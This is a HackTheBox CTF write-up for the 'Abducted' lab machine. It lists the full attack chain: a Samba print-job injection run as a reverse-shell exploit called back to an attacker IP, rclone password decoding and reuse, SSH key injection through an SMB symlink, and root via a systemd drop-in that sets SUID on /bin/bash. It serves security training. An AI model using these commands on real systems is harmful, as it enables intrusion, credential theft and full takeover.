# HackTheBox - Abducted Writeup

**Difficulty:** Medium
**OS:** Linux 

---

## Reconnaissance

### Nmap

```bash
nmap -sC -sV -A <MACHINE-IP> -oA abducted
```

```console
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
```

Three open ports — SSH and Samba (SMB). No web server. The NetBIOS name is `ABDUCTED` and the server string is `Hartley Group Document Services`.

### /etc/hosts

```bash
echo "<MACHINE-IP> abducted.htb" >> /etc/hosts
```

---

## SMB Enumeration

Listing shares anonymously:

```bash
smbclient -L //<MACHINE-IP> -N
```

```plaintext
Sharename       Type      Comment
---------       ----      -------
HP-Reception    Printer   Reception printer
projects        Disk      Hartley Group Project Files
transfer        Disk      Staff file transfer
IPC$            IPC       IPC Service (Hartley Group Document Services)
```

Three shares exposed. Attempting anonymous access:

```bash
smbclient //<MACHINE-IP>/projects -N
# NT_STATUS_ACCESS_DENIED

smbclient //<MACHINE-IP>/transfer -N
# NT_STATUS_ACCESS_DENIED
```

Both disk shares require authentication. `HP-Reception` is a printer share.

### RPC Enumeration

```bash
rpcclient -U "" -N <MACHINE-IP>
```

```console
rpcclient $> enumdomusers
user:[scott] rid:[0x3e8]

rpcclient $> querydispinfo
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: scott    Name: Scott Mercer

rpcclient $> netshareenum
netname: HP-Reception
        path: C:\var\spool\samba
netname: projects
        path: C:\srv\projects
netname: transfer
        path: C:\srv\transfer

rpcclient $> enumprinters
        name:[\\<MACHINE-IP>\]
        description:[\\<MACHINE-IP>\,,Reception printer]
        comment:[Reception printer]
```

One user identified: `scott`. The printer share path maps to `/var/spool/samba` on the host.

### SMB Protocol Versions

```bash
nmap --script smb-os-discovery,smb-protocols,smb2-security-mode -p445 <MACHINE-IP>
```

```yaml
| smb-protocols:
|   dialects:
|     2.0.2
|     2.1
|     3.0
|     3.0.2
|_    3.1.1
```

Samba is running with the printer share publicly accessible as guest. Noting the `HP-Reception` printer combined with recent Samba CVEs, this is the attack surface.

---

## Initial Foothold — CVE-2026-4480 (Samba %J Print Injection)

A critical vulnerability in Samba's printing subsystem was disclosed in 2026. Samba passes the client-controlled print job description string to the configured `print command` via the `%J` substitution character **without escaping shell metacharacters**. An unauthenticated attacker can submit a crafted print job whose description contains shell commands, resulting in remote code execution.

Reference: https://www.samba.org/samba/security/CVE-2026-4480.html

The exploit works by connecting to the `spoolss` named pipe, opening the printer handle, then submitting a `StartDocPrinter` call with a job name of `|sh`. The actual shell payload is sent as the print data — Samba's `%J` substitution injects the job name into the print command, causing the shell to execute it.

Setting up a listener:

```bash
nc -lvnp 4444
```

Running the exploit:

```bash
python3 cve-2026-4480.py -r <MACHINE-IP> -l <ATTACKER-IP> -p 4444
```

```console
[*] Target   : <MACHINE-IP>
[*] LHOST    : <ATTACKER-IP>
[*] LPORT    : 4444
[*] Printer  : HP-Reception
[*] Payload  : bash reverse shell

[*] Connecting to spoolss pipe...
[*] Opening printer handle...
[*] Starting document with |sh job name...
[+] Job submitted — check your listener!
```

A reverse shell connects as `nobody` — the Samba guest account.

```console
(remote) nobody@abducted:/$ id
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
```

---

## Post-Exploitation as nobody — rclone Credentials

Searching for configuration files outside standard system paths:

```bash
find / -type f -name "*.conf" 2>/dev/null | grep -Ev "^/usr/|^/etc/"
```

```plaintext
/opt/offsite-backup/rclone.conf
```

Reading it:

```bash
cat /opt/offsite-backup/rclone.conf
```

```ini
[offsite]
type = sftp
host = backup.hartley-group.internal
user = svc-backup
pass = HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
shell_type = unix
```

rclone stores passwords in an obfuscated (not encrypted) format. The `rclone reveal` command decodes it:

```bash
rclone reveal HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
```

```plaintext
iXzvcib3SrpZ
```

Plaintext password recovered: **iXzvcib3SrpZ**

---

## Lateral Movement — SSH as scott (Password Reuse)

With a password in hand and only two system users (`scott` and `marcus`), testing password reuse against SSH:

```bash
ssh scott@abducted.htb
# Password: iXzvcib3SrpZ
```

```console
scott@abducted:~$ id
uid=1000(scott) gid=1001(scott) groups=1001(scott)
```

Password reuse succeeded — `svc-backup`'s rclone password was reused for `scott`'s SSH account.

---

## User Flag

```bash
scott@abducted:~$ cat user.txt
```

```plaintext
HTB{REDACTED}
```

---

## Enumeration as scott

Checking sudo:

```bash
sudo -l
# Sorry, user scott may not run sudo on abducted.
```

No sudo. Reviewing the Samba configuration files now that a proper shell is available:

```bash
cat /etc/samba/smb.conf
```

```ini
[global]
   workgroup = WORKGROUP
   server string = Hartley Group Document Services
   netbios name = ABDUCTED
   map to guest = Bad User
   guest account = nobody
   security = user
   printing = sysv
   load printers = no
   disable spoolss = no
   unix extensions = no
   allow insecure wide links = yes
   include = /etc/samba/shares.conf
```

```bash
cat /etc/samba/shares.conf
```

```ini
[HP-Reception]
   comment = Reception printer
   path = /var/spool/samba
   printable = yes
   guest ok = yes
   print command = /usr/local/bin/printaudit %J %s
   lpq command = /bin/true
   lprm command = /bin/true

[projects]
   comment = Hartley Group Project Files
   path = /srv/projects
   valid users = scott
   read only = no
   browseable = yes

[transfer]
   comment = Staff file transfer
   path = /srv/transfer
   valid users = scott
   force user = marcus
   read only = no
   wide links = yes
   browseable = yes
```

Two key observations:

1. The `print command` confirms how CVE-2026-4480 worked — `%J` (job name) passes unsanitised into the shell command.
2. The `transfer` share has `force user = marcus` and `wide links = yes`. Any file written through it is created as `marcus`. With `wide links = yes`, symlinks are followed across share boundaries.

---

## Lateral Movement — SSH Key Injection via SMB Symlink

The `transfer` share forces file operations to run as `marcus`. Using a symlink from `/srv/transfer` into `marcus`'s home directory allows writing files as that user through the share.

Creating the symlink as `scott` (who can write to `/srv/transfer`):

```bash
ln -s /home/marcus /srv/transfer/marcus
```

Connecting to the `transfer` share as `scott` and navigating to `marcus`'s home via the symlink:

```bash
smbclient //<MACHINE-IP>/transfer -U 'scott%iXzvcib3SrpZ'
```

```console
smb: \> ls
  marcus    D    0  Thu Jun 11 07:29:45 2026

smb: \> cd marcus
smb: \marcus\> ls
  .profile
  .bash_logout
  .bash_history
  .bashrc
  .cache
```

Creating `.ssh` directory and uploading the attacker's public key:

```bash
smb: \marcus\> mkdir .ssh
smb: \marcus\> cd .ssh
smb: \marcus\.ssh\> put /home/kali/.ssh/id_rsa.pub authorized_keys
```

```console
putting file /home/kali/.ssh/id_rsa.pub as \marcus\.ssh\authorized_keys
```

SSH requires strict permissions on `authorized_keys` — the file must not be world-readable. Using smbclient's `setmode` to strip the read bit:

```bash
smb: \marcus\.ssh\> setmode authorized_keys a-r
```

Navigating back and fixing the `.ssh` directory permissions too:

```bash
smb: \marcus\.ssh\> cd ..
smb: \marcus\> setmode .ssh a-r+d
```

Connecting via SSH:

```bash
ssh -i /home/kali/.ssh/id_rsa marcus@abducted.htb
```

```console
marcus@abducted:~$ id
uid=1001(marcus) gid=1002(marcus) groups=1002(marcus),1000(operators)
```

`marcus` is a member of the `operators` group.

---

## Privilege Escalation to Root — systemd Drop-in (operators group)

Finding what the `operators` group has write access to:

```bash
find / -group operators 2>/dev/null
```

```plaintext
/etc/systemd/system/smbd.service.d
```

The `operators` group owns the `smbd.service.d` drop-in directory for the Samba service. systemd service drop-ins allow adding or overriding directives in a service unit without modifying the original file. Writing a drop-in with an `ExecStartPre` directive causes it to run as root when the service restarts.

Creating the malicious drop-in:

```bash
cat > /etc/systemd/system/smbd.service.d/privesc.conf << 'EOF'
[Service]
ExecStartPre=/bin/bash -c 'chmod +s /bin/bash'
EOF
```

Reloading the systemd daemon and restarting smbd:

```bash
systemctl daemon-reload
systemctl restart smbd
```

The `ExecStartPre` command runs as root, setting the SUID bit on `/bin/bash`. Spawning a root shell:

```bash
bash -p
```

```console
bash-5.2# whoami
root
```

---

## Root Flag

```bash
bash-5.2# cat /root/root.txt
```

```plaintext
HTB{REDACTED}
```

---

## Credentials Summary

| User | Credential | Source |
|------|-----------|--------|
| nobody (SMB) | — | CVE-2026-4480 unauthenticated RCE |
| scott (SSH) | iXzvcib3SrpZ | rclone.conf obfuscated password |
| marcus (SSH) | id_rsa | SMB symlink + wide links key injection |
| root | — | systemd drop-in ExecStartPre SUID bash |

---

## Key Vulnerabilities

| # | Vulnerability | Impact |
|---|--------------|--------|
| 1 | CVE-2026-4480 — Samba `%J` print job name shell injection | Unauthenticated RCE as nobody |
| 2 | rclone obfuscated password in world-readable config | Plaintext credential recovery |
| 3 | Password reuse across svc-backup and scott accounts | SSH access as scott |
| 4 | SMB `transfer` share: `force user = marcus` + `wide links = yes` | Write to marcus's home as marcus |
| 5 | `operators` group write access to `smbd.service.d` drop-in directory | Root via systemd ExecStartPre |

---

## Attack Chain

```plaintext
Nmap → SMB + Printer Share (HP-Reception)
  → CVE-2026-4480 %J Print Injection → RCE as nobody
    → /opt/offsite-backup/rclone.conf → obfuscated password
      → rclone reveal → iXzvcib3SrpZ
        → SSH password reuse → scott
          → SMB shares.conf: transfer share (force user=marcus, wide links=yes)
            → ln -s /home/marcus /srv/transfer/marcus
              → smbclient → write authorized_keys as marcus
                → SSH as marcus (operators group)
                  → find / -group operators → /etc/systemd/system/smbd.service.d
                    → systemd drop-in ExecStartPre → chmod +s /bin/bash
                      → bash -p → root
```